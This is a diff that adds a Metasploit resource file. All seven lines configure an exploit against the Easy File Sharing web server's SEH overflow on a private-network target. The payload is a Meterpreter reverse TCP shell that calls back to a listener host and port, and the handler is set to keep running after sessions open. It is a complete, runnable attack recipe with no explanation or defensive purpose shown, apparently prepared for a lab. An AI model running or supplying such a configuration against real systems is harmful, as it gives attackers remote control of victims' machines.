@@ -1,0 +1,7 @@
+Resource file (exp.rc)
+use exploit/windows/http/easyfilesharing_vfolder_seh
+set RHOST 192.168.100.55
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 192.168.100.10
+set LPORT 9911
+set ExitOnSession false
